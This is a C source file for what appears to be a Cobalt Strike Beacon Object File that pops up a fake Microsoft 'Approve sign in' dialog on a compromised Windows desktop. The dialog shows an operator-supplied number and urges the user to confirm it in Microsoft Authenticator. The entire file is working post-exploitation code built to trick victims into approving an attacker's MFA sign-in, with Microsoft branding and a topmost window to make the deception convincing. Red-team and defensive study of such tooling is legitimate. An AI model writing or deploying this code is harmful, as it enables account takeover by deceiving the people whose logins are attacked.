#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"

#define TIMEOUT_MS          30000  
#define TIMER_ID            1
#define WINDOW_WIDTH        380
#define WINDOW_HEIGHT       280
#define CLASS_NAME          L"MFAApprovalClass"

#define CAPTION_TEXT        L"Microsoft"
#define TITLE_TEXT          L"Approve sign in"
#define MESSAGE_TEXT        L"Tap the number you see below in your\nMicrosoft Authenticator app to sign in."

#define MFA_COLOR_BG        RGB(255, 255, 255)  
#define MFA_COLOR_TITLE     RGB(0, 0, 0)       
#define MFA_COLOR_MSG       RGB(100, 100, 100)  
#define MFA_COLOR_NUM       RGB(0, 120, 215)    

typedef struct _MFA_DIALOG_DATA {
    int     mfaNumber;
    HWND    hWnd;
    HFONT   hFontTitle;
    HFONT   hFontMessage;
    HFONT   hFontNumber;
    HBRUSH  hBrushBackground;
    BOOL    bTimedOut;
} MFA_DIALOG_DATA, *PMFA_DIALOG_DATA;

static MFA_DIALOG_DATA g_DialogData = {0};

LRESULT CALLBACK MFAWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

BOOL CreateDialogFonts(PMFA_DIALOG_DATA pData) {
    pData->hFontTitle = GDI32$CreateFontW(
        -26, 0, 0, 0, FW_SEMIBOLD,
        FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE,
        L"Segoe UI"
    );

    pData->hFontMessage = GDI32$CreateFontW(
        -15, 0, 0, 0, FW_NORMAL,
        FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE,
        L"Segoe UI"
    );

    pData->hFontNumber = GDI32$CreateFontW(
        -38, 0, 0, 0, FW_LIGHT,
        FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE,
        L"Segoe UI"
    );

    pData->hBrushBackground = GDI32$CreateSolidBrush(MFA_COLOR_BG);

    return (pData->hFontTitle && pData->hFontMessage && 
            pData->hFontNumber && pData->hBrushBackground);
}

VOID CleanupDialogFonts(PMFA_DIALOG_DATA pData) {
    if (pData->hFontTitle) {
        GDI32$DeleteObject(pData->hFontTitle);
        pData->hFontTitle = NULL;
    }
    if (pData->hFontMessage) {
        GDI32$DeleteObject(pData->hFontMessage);
        pData->hFontMessage = NULL;
    }
    if (pData->hFontNumber) {
        GDI32$DeleteObject(pData->hFontNumber);
        pData->hFontNumber = NULL;
    }
    if (pData->hBrushBackground) {
        GDI32$DeleteObject(pData->hBrushBackground);
        pData->hBrushBackground = NULL;
    }
}

LRESULT CALLBACK MFAWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            USER32$SetTimer(hWnd, TIMER_ID, TIMEOUT_MS, NULL);
            return 0;
        }

        case WM_TIMER: {
            if (wParam == TIMER_ID) {
                g_DialogData.bTimedOut = TRUE;
                USER32$KillTimer(hWnd, TIMER_ID);
                USER32$PostMessageW(hWnd, WM_CLOSE, 0, 0);
            }
            return 0;
        }

        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = USER32$BeginPaint(hWnd, &ps);
            RECT clientRect;
            RECT textRect;
            WCHAR szNumber[16];
            HGDIOBJ hOldFont;

            USER32$GetClientRect(hWnd, &clientRect);
            USER32$FillRect(hdc, &clientRect, g_DialogData.hBrushBackground);
            GDI32$SetBkMode(hdc, TRANSPARENT);

            textRect.left = 30;
            textRect.top = 40;
            textRect.right = clientRect.right - 30;
            textRect.bottom = textRect.top + 40;

            hOldFont = GDI32$SelectObject(hdc, g_DialogData.hFontTitle);
            GDI32$SetTextColor(hdc, MFA_COLOR_TITLE);
            USER32$DrawTextW(hdc, TITLE_TEXT, -1, &textRect, DT_LEFT | DT_SINGLELINE);

            textRect.top = 85;
            textRect.bottom = textRect.top + 50;

            GDI32$SelectObject(hdc, g_DialogData.hFontMessage);
            GDI32$SetTextColor(hdc, MFA_COLOR_MSG);
            USER32$DrawTextW(hdc, MESSAGE_TEXT, -1, &textRect, DT_LEFT | DT_WORDBREAK);

            textRect.top = 160;
            textRect.bottom = textRect.top + 80;

            MSVCRT$swprintf_s(szNumber, sizeof(szNumber)/sizeof(WCHAR), L"%d", g_DialogData.mfaNumber);

            GDI32$SelectObject(hdc, g_DialogData.hFontNumber);
            GDI32$SetTextColor(hdc, MFA_COLOR_NUM);
            USER32$DrawTextW(hdc, szNumber, -1, &textRect, DT_CENTER | DT_SINGLELINE);

            GDI32$SelectObject(hdc, hOldFont);
            USER32$EndPaint(hWnd, &ps);
            return 0;
        }

        case WM_CLOSE: {
            USER32$KillTimer(hWnd, TIMER_ID);
            USER32$DestroyWindow(hWnd);
            return 0;
        }

        case WM_DESTROY: {
            USER32$PostQuitMessage(0);
            return 0;
        }

        case WM_KEYDOWN: {
            if (wParam == VK_ESCAPE) {
                USER32$PostMessageW(hWnd, WM_CLOSE, 0, 0);
            }
            return 0;
        }

        default:
            return USER32$DefWindowProcW(hWnd, uMsg, wParam, lParam);
    }
}

DWORD WINAPI MFADialogThread(LPVOID lpParameter) {
    PMFA_DIALOG_DATA pData = (PMFA_DIALOG_DATA)lpParameter;
    WNDCLASSEXW wc = {0};
    HINSTANCE hInstance;
    HWND hWnd;
    MSG msg;
    int screenWidth, screenHeight;
    int posX, posY;

    hInstance = KERNEL32$GetModuleHandleW(NULL);

    if (!CreateDialogFonts(pData)) {
        CleanupDialogFonts(pData);
        internal_printf("Failed to create dialog fonts.\n");
        return 1;
    }

    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = MFAWindowProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInstance;
    wc.hIcon = NULL;
    wc.hCursor = NULL;
    wc.hbrBackground = pData->hBrushBackground;
    wc.lpszMenuName = NULL;
    wc.lpszClassName = CLASS_NAME;
    wc.hIconSm = NULL;

    if (!USER32$RegisterClassExW(&wc)) {
        internal_printf("Failed to register window class: %d\n", KERNEL32$GetLastError());
        CleanupDialogFonts(pData);
        return 1;
    }

    screenWidth = USER32$GetSystemMetrics(SM_CXSCREEN);
    screenHeight = USER32$GetSystemMetrics(SM_CYSCREEN);
    posX = (screenWidth - WINDOW_WIDTH) / 2;
    posY = (screenHeight - WINDOW_HEIGHT) / 2;

    hWnd = USER32$CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_DLGMODALFRAME,
        CLASS_NAME,
        CAPTION_TEXT,
        WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_VISIBLE,
        posX, posY,
        WINDOW_WIDTH, WINDOW_HEIGHT,
        NULL, NULL, hInstance, NULL
    );

    if (!hWnd) {
        internal_printf("Failed to create window: %d\n", KERNEL32$GetLastError());
        USER32$UnregisterClassW(CLASS_NAME, hInstance);
        CleanupDialogFonts(pData);
        return 1;
    }

    pData->hWnd = hWnd;

    USER32$ShowWindow(hWnd, SW_SHOW);
    USER32$UpdateWindow(hWnd);
    USER32$SetForegroundWindow(hWnd);
    USER32$SetFocus(hWnd);

    while (USER32$GetMessageW(&msg, NULL, 0, 0)) {
        USER32$TranslateMessage(&msg);
        USER32$DispatchMessageW(&msg);
    }

    USER32$UnregisterClassW(CLASS_NAME, hInstance);
    CleanupDialogFonts(pData);

    return 0;
}

DWORD ShowMFADialog(const int mfaNumber)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    HANDLE hThread = NULL;
    DWORD dwThreadId = 0;
    DWORD dwResult = 0;

    MSVCRT$memset(&g_DialogData, 0, sizeof(MFA_DIALOG_DATA));
    g_DialogData.mfaNumber = mfaNumber;
    g_DialogData.bTimedOut = FALSE;

    internal_printf("[*] Displaying MFA approval dialog with number: %d\n", mfaNumber);
    internal_printf("[*] Dialog will auto-close after 30 seconds...\n");

    hThread = KERNEL32$CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)MFADialogThread,
        &g_DialogData,
        0,
        &dwThreadId
    );

    if (hThread == NULL) {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("Failed to create dialog thread: %d\n", dwErrorCode);
        goto ShowMFADialog_end;
    }

    dwResult = KERNEL32$WaitForSingleObject(hThread, TIMEOUT_MS + 5000);

    if (dwResult == WAIT_TIMEOUT) {
        internal_printf("Dialog thread timed out, forcing close...\n");
        
        if (g_DialogData.hWnd) {
            USER32$PostMessageW(g_DialogData.hWnd, WM_CLOSE, 0, 0);
        }
        
        KERNEL32$TerminateThread(hThread, 0);
    }

    if (g_DialogData.bTimedOut) {
        internal_printf("[!] Dialog timed out after 30 seconds.\n");
    } else {
        internal_printf("[+] Dialog was closed by user.\n");
    }

ShowMFADialog_end:
    if (hThread) {
        KERNEL32$CloseHandle(hThread);
        hThread = NULL;
    }

    return dwErrorCode;
}

#ifdef BOF
VOID go( 
    IN PCHAR Buffer, 
    IN ULONG Length 
) 
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    datap parser = {0};
    int mfaNumber = 0;

    if (!Buffer || Length <= 0) 
    {
        internal_printf("[-] ERROR: No arguments provided");
        return;
    }

    BeaconDataParse(&parser, Buffer, Length);
    mfaNumber = BeaconDataInt(&parser);

    if(!bofstart())
    {
        return;
    }

    internal_printf("Calling ShowMFADialog with MFA number: %d\n", mfaNumber);

    dwErrorCode = ShowMFADialog(mfaNumber);
    if(ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ShowMFADialog failed: %lX\n", dwErrorCode);
        goto go_end;
    }

    internal_printf("SUCCESS.\n");

go_end:
    printoutput(TRUE);
    bofstop();
}

#else
#define TEST_MFA_NUMBER 42

int main(int argc, char ** argv)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    int mfaNumber = TEST_MFA_NUMBER;

    if (argc < 1) {
        printf("Usage: %s [MFA_Number]\n", argv[0]);
        return 1;
    }

    if (argc > 1) {
        mfaNumber = atoi(argv[1]);
    }

    printf("Calling ShowMFADialog with MFA number: %d\n", mfaNumber);

    dwErrorCode = ShowMFADialog(mfaNumber);
    if(ERROR_SUCCESS != dwErrorCode)
    {
        printf("ShowMFADialog failed: %lX\n", dwErrorCode);
        goto main_end;
    }

    printf("SUCCESS.\n");

main_end:
    return dwErrorCode;
}
#endif